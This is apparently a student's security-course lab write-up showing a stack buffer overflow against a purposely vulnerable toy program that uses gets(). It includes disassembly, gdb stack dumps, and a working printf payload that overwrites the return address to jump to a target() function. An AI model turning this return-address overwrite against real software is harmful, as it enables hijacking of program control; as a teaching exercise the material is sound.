@@ -1,0 +1,382 @@
+Name Rishikesh Khire
+rkhire1@binghamton.edu
+Project 5
+
+
+How to complie
+/> make
+
+how to run
+./attack-string <X>
+
+This will generate attack.input file.
+
+/>  ./vuln-program < ./attack.input
+
+This will do buffer overflow attack
+
+
+
+
+Below are the steps used to buffer overflow attack
+
+
+08048ee0 <target>:
+ 8048ee0:	55                   	push   ebp
+ 8048ee1:	89 e5                	mov    ebp,esp
+ 8048ee3:	83 ec 18             	sub    esp,0x18
+ 8048ee6:	c7 04 24 68 60 0c 08 	mov    DWORD PTR [esp],0x80c6068
+ 8048eed:	e8 8e 0c 00 00       	call   8049b80 <_IO_puts>
+ 8048ef2:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
+ 8048ef9:	e8 b2 08 00 00       	call   80497b0 <exit>
+
+08048efe <prompt>:
+ 8048efe:	55                   	push   ebp
+ 8048eff:	89 e5                	mov    ebp,esp
+ 8048f01:	81 ec 88 00 00 00    	sub    esp,0x88
+ 8048f07:	8d 45 94             	lea    eax,[ebp-0x6c]
+ 8048f0a:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048f0d:	e8 ce 0a 00 00       	call   80499e0 <_IO_gets>
+ 8048f12:	b8 76 60 0c 08       	mov    eax,0x80c6076
+ 8048f17:	8d 55 94             	lea    edx,[ebp-0x6c]
+ 8048f1a:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
+ 8048f1e:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048f21:	e8 8a 0a 00 00       	call   80499b0 <_IO_printf>
+ 8048f26:	c9                   	leave  
+ 8048f27:	c3                   	ret    
+
+08048f28 <main>:
+ 8048f28:	55                   	push   ebp
+ 8048f29:	89 e5                	mov    ebp,esp
+ 8048f2b:	83 e4 f0             	and    esp,0xfffffff0
+ 8048f2e:	e8 cb ff ff ff       	call   8048efe <prompt>
+ 8048f33:	b8 00 00 00 00       	mov    eax,0x0
+ 8048f38:	c9                   	leave  
+ 8048f39:	c3                   	ret    
+ 8048f3a:	90                   	nop
+ 8048f3b:	90                   	nop
+ 8048f3c:	90                   	nop
+ 8048f3d:	90                   	nop
+ 8048f3e:	90                   	nop
+ 8048f3f:	90                   	nop
+
+
+rkhire1@rkhire1-Lenovo-IdeaPad-Y410P:~/security5$ gdb ./vuln_program
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/rkhire1/security5/vuln_program...done.
+(gdb) list 
+10	void prompt(){
+11		char buf[100];
+12	
+13		gets(buf);
+14		printf("You entered: %s\n", buf);
+15	
+16	}
+17	
+18	int main(){
+19		prompt();
+(gdb) 
+20	
+21		return 0;
+22	}
+23	
+(gdb) 
+Line number 24 out of range; ./main.c has 23 lines.
+(gdb) b 19
+Breakpoint 1 at 0x8048f2e: file ./main.c, line 19.
+(gdb) b 14
+Breakpoint 2 at 0x8048f12: file ./main.c, line 14.
+(gdb) run
+Starting program: /home/rkhire1/security5/vuln_program 
+
+Breakpoint 1, main () at ./main.c:19
+19		prompt();
+(gdb) x/8xw $esp
+0xbffff2c0:	0x00000000	0x08049650	0x080495b0	0x080490c6
+0xbffff2d0:	0x00000001	0xbffff354	0xbffff35c	0x00000000
+(gdb) s
+prompt () at ./main.c:13
+13		gets(buf);
+(gdb) x/8xw $esp
+0xbffff230:	0x080eeff4	0x00000001	0xbffff354	0x000047e7
+0xbffff240:	0x080df7a8	0x080efca8	0x00000000	0x00000000
+(gdb) x/100xw $esp
+0xbffff230:	0x080eeff4	0x00000001	0xbffff354	0x000047e7
+0xbffff240:	0x080df7a8	0x080efca8	0x00000000	0x00000000
+0xbffff250:	0x00000001	0x00008000	0xbffff35c	0x08048c31
+0xbffff260:	0x080df7a8	0x00000007	0x0000000d	0x03100800
+0xbffff270:	0x080c897a	0x080eeff4	0xbffff35c	0x00000000
+0xbffff280:	0x00000001	0xbffff354	0xbffff35c	0x0804963a
+0xbffff290:	0x00000001	0xbffff354	0xbffff35c	0x00000001
+0xbffff2a0:	0xbffff354	0x00000001	0xbffff354	0x00000001
+0xbffff2b0:	0x08049650	0x00000000	0xbffff2c8	0x08048f33
+0xbffff2c0:	0x00000000	0x08049650	0x080495b0	0x080490c6
+0xbffff2d0:	0x00000001	0xbffff354	0xbffff35c	0x00000000
+0xbffff2e0:	0x00000000	0x00000000	0x08049650	0x080495b0
+0xbffff2f0:	0xffe5a17f	0x09210810	0x00000000	0x00000000
+0xbffff300:	0x00000000	0x00000000	0x00000000	0x8d94a400
+0xbffff310:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff320:	0x00000001	0x00000000	0x00000000	0x08048e29
+0xbffff330:	0x08048f28	0x00000001	0xbffff354	0x080495b0
+0xbffff340:	0x08049650	0x00000000	0xbffff34c	0x00000000
+0xbffff350:	0x00000001	0xbffff4c2	0x00000000	0xbffff4e7
+0xbffff360:	0xbffff4fb	0xbffff526	0xbffff536	0xbffff541
+0xbffff370:	0xbffff592	0xbffff5a4	0xbffff5ce	0xbffff5db
+0xbffff380:	0xbffffafc	0xbffffb36	0xbffffb6a	0xbffffb90
+0xbffff390:	0xbffffbc3	0xbffffc43	0xbffffc4f	0xbffffc7c
+0xbffff3a0:	0xbffffc93	0xbffffd1d	0xbffffd2c	0xbffffd48
+0xbffff3b0:	0xbffffd59	0xbffffd71	0xbffffda7	0xbffffdc4
+(gdb) x/s 0x00000001
+0x1:	 <Address 0x1 out of bounds>
+(gdb) ^CQuit
+(gdb) x/s 0x08048f33
+0x8048f33 <main+11>:	 "\270"
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048f28 <+0>:	push   %ebp
+   0x08048f29 <+1>:	mov    %esp,%ebp
+   0x08048f2b <+3>:	and    $0xfffffff0,%esp
+   0x08048f2e <+6>:	call   0x8048efe <prompt>
+   0x08048f33 <+11>:	mov    $0x0,%eax
+   0x08048f38 <+16>:	leave  
+   0x08048f39 <+17>:	ret    
+End of assembler dump.
+(gdb) s
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 2, prompt () at ./main.c:14
+14		printf("You entered: %s\n", buf);
+(gdb) x/100xw $esp
+0xbffff230:	0xbffff24c	0x00000001	0xbffff354	0x000047e7
+0xbffff240:	0x080df7a8	0x080efca8	0x00000000	0x41414141
+0xbffff250:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff260:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff270:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff280:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff290:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff2a0:	0x41414141	0x00004141	0xbffff354	0x00000001
+0xbffff2b0:	0x08049650	0x00000000	0xbffff2c8	0x08048f33
+0xbffff2c0:	0x00000000	0x08049650	0x080495b0	0x080490c6
+0xbffff2d0:	0x00000001	0xbffff354	0xbffff35c	0x00000000
+0xbffff2e0:	0x00000000	0x00000000	0x08049650	0x080495b0
+0xbffff2f0:	0xffe5a17f	0x09210810	0x00000000	0x00000000
+0xbffff300:	0x00000000	0x00000000	0x00000000	0x8d94a400
+0xbffff310:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff320:	0x00000001	0x00000000	0x00000000	0x08048e29
+0xbffff330:	0x08048f28	0x00000001	0xbffff354	0x080495b0
+0xbffff340:	0x08049650	0x00000000	0xbffff34c	0x00000000
+0xbffff350:	0x00000001	0xbffff4c2	0x00000000	0xbffff4e7
+0xbffff360:	0xbffff4fb	0xbffff526	0xbffff536	0xbffff541
+0xbffff370:	0xbffff592	0xbffff5a4	0xbffff5ce	0xbffff5db
+0xbffff380:	0xbffffafc	0xbffffb36	0xbffffb6a	0xbffffb90
+0xbffff390:	0xbffffbc3	0xbffffc43	0xbffffc4f	0xbffffc7c
+0xbffff3a0:	0xbffffc93	0xbffffd1d	0xbffffd2c	0xbffffd48
+0xbffff3b0:	0xbffffd59	0xbffffd71	0xbffffda7	0xbffffdc4
+(gdb) x/s 0x08048f33
+0x8048f33 <main+11>:	 "\270"
+(gdb) 
+
+///////////////////////////////////////////////
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/rkhire1/security5/vuln_program...done.
+(gdb) list
+10	void prompt(){
+11		char buf[100];
+12	
+13		gets(buf);
+14		printf("You entered: %s\n", buf);
+15	
+16	}
+17	
+18	int main(){
+19		prompt();
+(gdb) 
+20	
+21		return 0;
+22	}
+23	
+(gdb) 
+Line number 24 out of range; ./main.c has 23 lines.
+(gdb) b 19
+Breakpoint 1 at 0x8048f2e: file ./main.c, line 19.
+(gdb) b 14
+Breakpoint 2 at 0x8048f12: file ./main.c, line 14.
+(gdb) run
+Starting program: /home/rkhire1/security5/vuln_program 
+
+Breakpoint 1, main () at ./main.c:19
+19		prompt();
+(gdb) x/8xw $esp
+0xbffff2c0:	0x00000000	0x08049650	0x080495b0	0x080490c6
+0xbffff2d0:	0x00000001	0xbffff354	0xbffff35c	0x00000000
+(gdb) s
+prompt () at ./main.c:13
+13		gets(buf);
+(gdb) x/100xw $esp
+0xbffff230:	0x080eeff4	0x00000001	0xbffff354	0x000047e7
+0xbffff240:	0x080df7a8	0x080efca8	0x00000000	0x00000000
+0xbffff250:	0x00000001	0x00008000	0xbffff35c	0x08048c31
+0xbffff260:	0x080df7a8	0x00000007	0x0000000d	0x01100800
+0xbffff270:	0x080c897a	0x080eeff4	0xbffff35c	0x00000000
+0xbffff280:	0x00000001	0xbffff354	0xbffff35c	0x0804963a
+0xbffff290:	0x00000001	0xbffff354	0xbffff35c	0x00000001
+0xbffff2a0:	0xbffff354	0x00000001	0xbffff354	0x00000001
+0xbffff2b0:	0x08049650	0x00000000	0xbffff2c8	0x08048f33
+0xbffff2c0:	0x00000000	0x08049650	0x080495b0	0x080490c6
+0xbffff2d0:	0x00000001	0xbffff354	0xbffff35c	0x00000000
+0xbffff2e0:	0x00000000	0x00000000	0x08049650	0x080495b0
+0xbffff2f0:	0xffe5a17f	0x09210810	0x00000000	0x00000000
+0xbffff300:	0x00000000	0x00000000	0x00000000	0x8df7b600
+0xbffff310:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff320:	0x00000001	0x00000000	0x00000000	0x08048e29
+0xbffff330:	0x08048f28	0x00000001	0xbffff354	0x080495b0
+0xbffff340:	0x08049650	0x00000000	0xbffff34c	0x00000000
+0xbffff350:	0x00000001	0xbffff4c2	0x00000000	0xbffff4e7
+0xbffff360:	0xbffff4fb	0xbffff526	0xbffff536	0xbffff541
+0xbffff370:	0xbffff592	0xbffff5a4	0xbffff5ce	0xbffff5db
+0xbffff380:	0xbffffafc	0xbffffb36	0xbffffb6a	0xbffffb90
+0xbffff390:	0xbffffbc3	0xbffffc43	0xbffffc4f	0xbffffc7c
+0xbffff3a0:	0xbffffc93	0xbffffd1d	0xbffffd2c	0xbffffd48
+0xbffff3b0:	0xbffffd59	0xbffffd71	0xbffffda7	0xbffffdc4
+(gdb) s
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 2, prompt () at ./main.c:14
+14		printf("You entered: %s\n", buf);
+(gdb) x/100xw $esp
+0xbffff230:	0xbffff24c	0x00000001	0xbffff354	0x000047e7
+0xbffff240:	0x080df7a8	0x080efca8	0x00000000	0x41414141
+0xbffff250:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff260:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff270:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff280:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff290:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff2a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff2b0:	0x41414141	0x41414141	0x41414141	0x08004141
+0xbffff2c0:	0x00000000	0x08049650	0x080495b0	0x080490c6
+0xbffff2d0:	0x00000001	0xbffff354	0xbffff35c	0x00000000
+0xbffff2e0:	0x00000000	0x00000000	0x08049650	0x080495b0
+0xbffff2f0:	0xffe5a17f	0x09210810	0x00000000	0x00000000
+0xbffff300:	0x00000000	0x00000000	0x00000000	0x8df7b600
+0xbffff310:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff320:	0x00000001	0x00000000	0x00000000	0x08048e29
+0xbffff330:	0x08048f28	0x00000001	0xbffff354	0x080495b0
+0xbffff340:	0x08049650	0x00000000	0xbffff34c	0x00000000
+0xbffff350:	0x00000001	0xbffff4c2	0x00000000	0xbffff4e7
+0xbffff360:	0xbffff4fb	0xbffff526	0xbffff536	0xbffff541
+0xbffff370:	0xbffff592	0xbffff5a4	0xbffff5ce	0xbffff5db
+0xbffff380:	0xbffffafc	0xbffffb36	0xbffffb6a	0xbffffb90
+0xbffff390:	0xbffffbc3	0xbffffc43	0xbffffc4f	0xbffffc7c
+0xbffff3a0:	0xbffffc93	0xbffffd1d	0xbffffd2c	0xbffffd48
+0xbffff3b0:	0xbffffd59	0xbffffd71	0xbffffda7	0xbffffdc4
+(gdb) s
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+16	}
+(gdb) print /x $eip
+$1 = 0x8048f26
+(gdb) s
+Warning:
+Cannot insert breakpoint 0.
+Error accessing memory address 0x0: Input/output error.
+
+0x08004141 in ?? ()
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 26604] will be killed.
+
+Quit anyway? (y or n) y
+rkhire1@rkhire1-Lenovo-IdeaPad-Y410P:~/security5$ printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/xAA/xAA"| ./vuln_program
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/xAA/xAA
+Segmentation fault (core dumped)
+rkhire1@rkhire1-Lenovo-IdeaPad-Y410P:~/security5$ gdb
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>.
+(gdb) list 1
+No symbol table is loaded.  Use the "file" command.
+(gdb) list 0
+No symbol table is loaded.  Use the "file" command.
+(gdb) q
+rkhire1@rkhire1-Lenovo-IdeaPad-Y410P:~/security5$ gdb ./vuln_program
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/rkhire1/security5/vuln_program...done.
+(gdb) list 1
+1	
+2	#include <stdio.h>
+3	#include <stdlib.h>
+4	
+5	void target(){
+6		printf("Woooo! Pwn3d!\n");
+7		exit(0);
+8	}
+9	
+10	void prompt(){
+(gdb) 
+11		char buf[100];
+12	
+13		gets(buf);
+14		printf("You entered: %s\n", buf);
+15	
+16	}
+17	
+18	int main(){
+19		prompt();
+20	
+(gdb) 
+21		return 0;
+22	}
+23	
+(gdb) disas target
+Dump of assembler code for function target:
+   0x08048ee0 <+0>:	push   %ebp
+   0x08048ee1 <+1>:	mov    %esp,%ebp
+   0x08048ee3 <+3>:	sub    $0x18,%esp
+   0x08048ee6 <+6>:	movl   $0x80c6068,(%esp)
+   0x08048eed <+13>:	call   0x8049b80 <puts>
+   0x08048ef2 <+18>:	movl   $0x0,(%esp)
+   0x08048ef9 <+25>:	call   0x80497b0 <exit>
+End of assembler dump.
+
+rkhire1@rkhire1-Lenovo-IdeaPad-Y410P:~/security5$ printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe0\x8e\x04\x08" | ./vuln_program
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+Woooo! Pwn3d!
+rkhire1@rkhire1-Lenovo-IdeaPad-Y410P:~/security5$ 
+
+rkhire1@rkhire1-Lenovo-IdeaPad-Y410P:~/security5$ printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe0\x8e\x04\x08" | ./vuln_program
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+Woooo! Pwn3d!
+
+
